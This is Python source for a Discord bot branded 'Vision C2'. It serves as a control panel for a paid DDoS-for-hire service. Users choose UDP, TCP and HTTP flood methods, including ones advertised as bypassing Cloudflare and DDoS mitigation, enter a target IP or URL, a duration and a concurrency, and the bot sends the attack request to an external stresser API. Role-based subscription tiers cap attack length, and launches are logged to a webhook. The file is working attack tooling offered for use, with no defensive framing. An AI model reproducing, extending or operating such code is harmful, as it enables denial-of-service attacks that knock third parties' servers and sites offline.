# Requirements: pip install discord.py aiohttp
import discord
from discord import app_commands
from discord.ext import commands
import aiohttp
import json
import asyncio
import time
import os
from datetime import datetime
from typing import Optional

# --- CONFIGURAZIONE SICURA ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
API_KEY = os.environ.get("API_KEY")
API_START_URL = "https://satellitestress.st/api/v1/attack/start"
LOG_WEBHOOK_URL = os.environ.get("WEBHOOK_URL")

ALLOWED_CHANNEL_ID = 1466303379566231681
COOLDOWN_BYPASS_ROLE_ID = 1466089252507881752
GLOBAL_COOLDOWN_TIME = 60

last_attack_time = 0

CONCURRENT_ROLES = {
    1466087570386452693: (1, 60),    1466087635608146137: (2, 100),
    1466087646647419030: (3, 120),   1466087656248049797: (4, 140),
    1466087665265803542: (5, 160),   1466087676162605381: (6, 180),
    1466087696039546965: (7, 200),   1466087709511520422: (8, 220),
    1466087720991588434: (9, 240),   1466087731875811379: (10, 300),
    1468246120814608404: (11, 360),  1468246159599337584: (12, 420),
    1468246164511002675: (13, 480),  1468246167229038613: (14, 540),
    1468246171045728287: (15, 600),  1468246174791241952: (16, 660),
    1468246179468017785: (17, 720),  1468246182944837737: (18, 780),
    1468246185805611222: (19, 840),  1468246190595506216: (20, 900),
    1468246193657086012: (21, 990),  1468246197616775281: (22, 1080),
    1468246200816766997: (23, 1170), 1468246204059226296: (24, 1260),
    1468246207854809305: (25, 1350), 1468246212028272650: (26, 1440),
    1468246215312277694: (27, 1530), 1468246218739024019: (28, 1620),
    1468246222337998868: (29, 1710), 1468246226968514746: (30, 1800),
}

PROFILES = {
    "TCP-APP": ["SSH", "FTP", "SMTP", "IMAP", "POP3", "TELNET", "LDAP", "RDP", "SMB", "MYSQL", "POSTGRESQL", "IRC", "BGP", "FIVEM", "MCJE"],
    "UDP-APP": ["RAKNET", "A2S", "QUAKE", "SAMP", "OPENVPN", "TS3", "DISCORD", "ENET"]
}

# --- UI COMPONENTS ---

class L4Modal(discord.ui.Modal, title="Vision C2: L4 Dispatch"):
    def __init__(self, method: str, profile: Optional[str] = None):
        super().__init__()
        self.method_val = method
        self.profile_val = profile
        self.host = discord.ui.TextInput(label="Target Host (IP)", placeholder="1.1.1.1", required=True)
        self.port = discord.ui.TextInput(label="Target Port", placeholder="80", required=True)
        self.time = discord.ui.TextInput(label="Duration (Seconds)", placeholder="60", required=True)
        self.concurrents = discord.ui.TextInput(label="Concurrents", placeholder="1", required=True)
        
        self.payload = None
        if self.method_val == "UDP-CUSTOM":
            self.payload = discord.ui.TextInput(label="Payload (Hex/ASCII)", placeholder="ABC123", required=True)
        
        self.add_item(self.host)
        self.add_item(self.port)
        self.add_item(self.time)
        self.add_item(self.concurrents)
        if self.payload:
            self.add_item(self.payload)

    async def on_submit(self, interaction: discord.Interaction):
        params = {
            "host": self.host.value,
            "port": self.port.value,
            "time": self.time.value,
            "concurrent": self.concurrents.value,
            "method": self.method_val.upper(),
        }
        if self.profile_val: params["profile"] = self.profile_val
        if self.payload: params["payload"] = self.payload.value
        await handle_api_call(interaction, params)

class ProfileSelect(discord.ui.Select):
    def __init__(self, method: str):
        self.method_val = method
        options = [discord.SelectOption(label=p, value=p) for p in PROFILES.get(method, [])]
        super().__init__(placeholder=f"Select profile for {method}...", options=options)

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.send_modal(L4Modal(method=self.method_val, profile=self.values[0]))

class L7Modal(discord.ui.Modal, title="Vision C2: L7 Dispatch"):
    def __init__(self, method: str = "HTTP-FULL"):
        super().__init__()
        self.method_val = method
        self.url = discord.ui.TextInput(label="Target URL", placeholder="https://example.com", required=True)
        self.time = discord.ui.TextInput(label="Duration (Seconds)", placeholder="60", required=True)
        self.concurrents = discord.ui.TextInput(label="Concurrents", placeholder="1", required=True)
        self.advanced_config = discord.ui.TextInput(
            label="Method | HTTP Ver | Rate Limit", 
            placeholder="GET | 2 | 500", 
            default="GET | 2 | 500", 
            required=True
        )
        
        self.add_item(self.url)
        self.add_item(self.time)
        self.add_item(self.concurrents)
        self.add_item(self.advanced_config)

    async def on_submit(self, interaction: discord.Interaction):
        try:
            parts = [p.strip() for p in self.advanced_config.value.split("|")]
            req_m = parts[0] if len(parts) > 0 else "GET"
            h_ver = parts[1] if len(parts) > 1 else "2"
            r_lim = parts[2] if len(parts) > 2 else "500"
        except:
            req_m, h_ver, r_lim = "GET", "2", "500"

        await handle_api_call(interaction, {
            "host": self.url.value,
            "port": "443",
            "time": self.time.value,
            "concurrent": self.concurrents.value,
            "method": self.method_val,
            "requestmethod": req_m.upper(),
            "http": h_ver,
            "ratelimit": r_lim
        })

class L7MethodSelect(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="HTTP-FULL", description="Advanced Chrome Flooder + Cookie Support", emoji="🌐"),
            discord.SelectOption(label="HTTP-CONNECT", description="Cloudflare/Mitigation Bypass Vector", emoji="🔗"),
        ]
        super().__init__(placeholder="Select L7 Attack Method...", options=options)

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.send_modal(L7Modal(method=self.values[0]))

class L4MethodSelect(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="UDP-APP", description="App-specific flood (Requires Profile)", emoji="👤"),
            discord.SelectOption(label="UDP-BIG", description="Volumetric large packets", emoji="🔥"),
            discord.SelectOption(label="UDP-CUSTOM", description="Custom payload flood", emoji="🛠️"),
            discord.SelectOption(label="UDP-PPS", description="High Packet Per Second", emoji="💨"),
            discord.SelectOption(label="TCP-APP", description="App-specific TCP (Requires Profile)", emoji="👤"),
            discord.SelectOption(label="TCP-CONNECT", description="Stateful Handshake + PSH/ACK", emoji="🔗"),
            discord.SelectOption(label="TCP-FULL", description="Pure Kernel Handshakes", emoji="⚙️"),
            discord.SelectOption(label="TCP-OUR", description="TLS + Out-of-order PSH/ACK", emoji="🛡️"),
            discord.SelectOption(label="RIP", description="Layer 3 Network Bypass", emoji="🛰️"),
        ]
        super().__init__(placeholder="Select L4 Attack Method...", options=options)

    async def callback(self, interaction: discord.Interaction):
        method = self.values[0]
        if method in ["UDP-APP", "TCP-APP"]:
            view = discord.ui.View()
            view.add_item(ProfileSelect(method=method))
            await interaction.response.send_message(f"📋 Please select a profile for `{method}`:", view=view, ephemeral=False)
        else:
            await interaction.response.send_modal(L4Modal(method=method))

class AttackHubView(discord.ui.View):
    def __init__(self, concurrents, max_time):
        super().__init__(timeout=None)
        self.concurrents = concurrents
        self.max_time = max_time

    @discord.ui.button(label="L4 Attack", style=discord.ButtonStyle.primary, emoji="⚡")
    async def l4_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await validate_interaction(interaction): return
        l4_select_view = discord.ui.View()
        l4_select_view.add_item(L4MethodSelect())
        await interaction.response.send_message("🛠️ Select a Layer 4 method to proceed:", view=l4_select_view, ephemeral=False)

    @discord.ui.button(label="L7 Attack", style=discord.ButtonStyle.success, emoji="🌐")
    async def l7_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await validate_interaction(interaction): return
        l7_select_view = discord.ui.View()
        l7_select_view.add_item(L7MethodSelect())
        await interaction.response.send_message("🌐 Select a Layer 7 method to proceed:", view=l7_select_view, ephemeral=False)

# --- CORE LOGIC ---

async def validate_interaction(interaction: discord.Interaction) -> bool:
    global last_attack_time
    if interaction.channel_id != ALLOWED_CHANNEL_ID:
        await interaction.response.send_message(f"❌ Commands are only allowed in <#{ALLOWED_CHANNEL_ID}>.", ephemeral=False)
        return False
    
    has_bypass = any(role.id == COOLDOWN_BYPASS_ROLE_ID for role in interaction.user.roles)
    if not has_bypass:
        current_time = time.time()
        time_passed = current_time - last_attack_time
        if time_passed < GLOBAL_COOLDOWN_TIME:
            remaining = int(GLOBAL_COOLDOWN_TIME - time_passed)
            await interaction.response.send_message(f"⏳ **Global Cooldown:** Please wait `{remaining}s` before the next dispatch.", ephemeral=False)
            return False
    return True

async def handle_api_call(interaction: discord.Interaction, params):
    global last_attack_time
    if not interaction.response.is_done():
        await interaction.response.defer(ephemeral=False)
    
    has_bypass = any(role.id == COOLDOWN_BYPASS_ROLE_ID for role in interaction.user.roles)
    if not has_bypass:
        current_time = time.time()
        if current_time - last_attack_time < GLOBAL_COOLDOWN_TIME:
            return await interaction.followup.send("⏳ **Cooldown Active:** Another operator just launched a signal.", ephemeral=False)

    plan_concurrents, max_time = await get_user_limits(interaction.user)
    
    try:
        req_time = int(params['time'])
        req_concurrents = int(params['concurrent'])
    except ValueError:
        return await interaction.followup.send("❌ Invalid duration or concurrent value.", ephemeral=False)

    if req_time > max_time or req_concurrents > plan_concurrents:
        return await interaction.followup.send(f"⚠️ Limit Exceeded. Max: {max_time}s / {plan_concurrents} concs.", ephemeral=False)

    api_params = {
        "key": API_KEY, "host": params['host'], "port": params['port'],
        "time": req_time, "method": params['method'], "concurrent": req_concurrents
    }
    
    for key in ['profile', 'payload', 'requestmethod', 'http', 'ratelimit']:
        if params.get(key): api_params[key] = params[key]

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(API_START_URL, params=api_params, timeout=15) as response:
                try: data = await response.json()
                except: data = {"success": False, "message": await response.text()}

                if response.status == 200 and data.get("success"):
                    last_attack_time = time.time()
                    embed = discord.Embed(title="📡 Signal Dispatched", color=0x00f2ff, timestamp=datetime.now())
                    embed.set_author(name="Vision C2 Command Unit")
                    embed.add_field(name="🎯 Target", value=f"`{params['host']}`", inline=True)
                    embed.add_field(name="⚙️ Vector", value=f"`{params['method']}`", inline=True)
                    embed.add_field(name="🕒 Duration", value=f"`{req_time}s`", inline=True)
                    if params.get('requestmethod'): embed.add_field(name="📝 Type", value=f"`{params['requestmethod']} (H{params['http']})`", inline=True)
                    embed.set_footer(text=f"Operator: {interaction.user.name} | Concs: {req_concurrents}")
                    
                    await interaction.followup.send("✅ **Attack Sent**", ephemeral=False)
                    await send_to_webhook(f"🟢 **C2 LOG DISPATCH**", embed)
                else:
                    await interaction.followup.send(f"❌ API Error: {data.get('message', 'Unknown')}", ephemeral=False)
    except Exception as e:
        await interaction.followup.send(f"💀 System Fault: {str(e)}", ephemeral=False)

async def get_user_limits(member):
    best_c, best_t = 0, 0
    for role in member.roles:
        if role.id in CONCURRENT_ROLES:
            c, t = CONCURRENT_ROLES[role.id]
            if c > best_c: best_c, best_t = c, t
    return best_c, best_t

async def send_to_webhook(content, embed=None):
    if not LOG_WEBHOOK_URL: return
    async with aiohttp.ClientSession() as session:
        data = {"content": content, "embeds": [embed.to_dict()] if embed else []}
        try: await session.post(LOG_WEBHOOK_URL, json=data)
        except: pass

class VisionC2(discord.Client):
    def __init__(self):
        super().__init__(intents=discord.Intents.all())
        self.tree = app_commands.CommandTree(self)
    async def setup_hook(self):
        await self.tree.sync()

client = VisionC2()

@client.event
async def on_ready():
    print(f"✅ Vision C2 Terminal Ready: {client.user}")

@client.tree.command(name="attack", description="Access the Vision C2 Command Hub")
async def attack_hub(interaction: discord.Interaction):
    if interaction.channel_id != ALLOWED_CHANNEL_ID:
        return await interaction.response.send_message(f"❌ Commands are only allowed in <#{ALLOWED_CHANNEL_ID}>.", ephemeral=True)

    concurrents, max_time = await get_user_limits(interaction.user)
    if concurrents == 0:
        return await interaction.response.send_message("❌ **Access Denied.** No Vision C2 clearance found.", ephemeral=False)

    embed = discord.Embed(title="🛰️ Vision C2 Command Hub", description="Select your attack vector type below to initialize satellite link.", color=0x00f2ff)
    embed.add_field(name="📊 Your Plan Status", value=f"**Concurrents:** `{concurrents}`\n**Max Duration:** `{max_time}s`", inline=False)
    embed.set_footer(text="Vision Command Unit | Authorized Personnel Only")
    await interaction.response.send_message(embed=embed, view=AttackHubView(concurrents, max_time), ephemeral=False)

@client.tree.command(name="list", description="Display available Vision Methods")
async def list_methods(interaction: discord.Interaction):
    embed = discord.Embed(title="🛰️ Vision Methods", color=0x00f2ff)
    
    # Layer 4 (UDP)
    udp_desc = (
        "**UDP-APP:** Gaming/Communication custom payload flood.\n"
        "└ *Profiles:* `RAKNET`, `A2S`, `QUAKE`, `SAMP`, `OPENVPN`, `TS3`, `DISCORD`, `ENET`\n"
        "**UDP-BIG:** High-bandwidth volumetric attack (Large packets).\n"
        "**UDP-PPS:** High Packets-Per-Second CPU/Kernel overwhelm."
    )
    embed.add_field(name="🌐 Layer 4 (UDP)", value=udp_desc, inline=False)
    
    # Layer 4 (TCP)
    tcp_desc = (
        "**TCP-APP:** Protocol-specific TCP application layer attack.\n"
        "└ *Profiles:* `SSH`, `FTP`, `SMTP`, `IMAP`, `POP3`, `TELNET`, `LDAP`, `RDP`, `SMB`, `MYSQL`, `POSTGRESQL`, `IRC`, `BGP`, `FIVEM`, `MCJE`\n"
        "**TCP-CONNECT:** Stateful handshake flood with PSH/ACK payloads.\n"
        "**TCP-FULL:** Pure Handshake Kernel Built (No Mitigation).\n"
        "**TCP-OUR:** TLS Handshakes + Out-of-order PSH/ACK."
    )
    embed.add_field(name="🔒 Layer 4 (TCP)", value=tcp_desc, inline=False)
    
    # Layer 7 (HTTP)
    l7_desc = (
        "**HTTP-FULL:** Advanced Chrome flooder with cookie jars & adaptive rate limiting.\n"
        "**HTTP-CONNECT:** Proxy-based tunnel flood for Cloudflare & DDoS protection bypass."
    )
    embed.add_field(name="🔥 Layer 7 (HTTP)", value=l7_desc, inline=False)
    
    await interaction.response.send_message(embed=embed)

if __name__ == "__main__":
    if BOT_TOKEN: client.run(BOT_TOKEN)
    else: print("❌ CRITICAL ERROR: BOT_TOKEN is missing.")
